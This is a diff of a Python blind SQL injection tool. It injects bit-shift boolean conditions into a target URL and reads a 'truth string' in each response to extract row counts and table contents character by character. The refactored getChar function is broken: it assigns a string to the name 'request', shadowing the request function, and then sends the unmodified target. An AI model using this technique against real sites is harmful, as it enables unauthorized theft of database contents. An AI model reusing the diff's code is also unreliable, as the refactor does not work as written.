@@ -19,9 +19,9 @@ dump = []
 
 # Fix the supplied target so requests doesn't complain.
 def fix_host(host):
-    if ((not host.startswith("http://")) and (not host.startswith("https://"))):
+    if not host.startswith("http://") and not host.startswith("https://"):
         host = "http://" + host
-    if (host.endswith("/")):
+    if host.endswith("/"):
         host = host[:-1]
     return host
 
@@ -35,35 +35,29 @@ def request(target):
 
 # Grab the number of rows that we have to dump.
 def getNumberOfRows():
-    count = 1
-    s = ''
+    count, s = 1, ''
     while True:
         target = '%s and ((select ascii(substr(count(%s), {index}, 1)) from %s)>>{shift})={result}' % (options['target'],
                                                                                                        options['columns'].split(',')[0],
                                                                                                        options['table_name'])
-        target = target.replace('{index}', str(count))
-        char = getChar(target)
-        if char == 1:
+        char = getChar(target.replace('{index}', str(count)))
+        if char == 1: # EOF; we're done
             return int(s)
-        else:
+        else: # Nice; keep going
             s += str(char)
             count += 1
 
 
 # Here we actually calculate a character.
 def getChar(target, assume_ascii=bool(options['assume_only_ascii'])):
-    otarget = target
     byte = ''
     for x in range(8):
         if x == 0 and assume_ascii:
             # If charset is ASCII, first bit is 0.
             byte += '0'
         else:
-            target = otarget
-            next_if_set = int(byte + '1', 2)
-            # 7-x is a clever expression that evaluates to the current shift.
-            target = target.replace('{shift}', str(7 - x))
-            target = target.replace('{result}', str(next_if_set))
+            request = target.replace('{shift}', str(7 - x))
+            request = request.replace('{result}', str(int(byte + '1', 2)))
             response = request(target)
             if options['truth_string'] in response:
                 byte += '1'
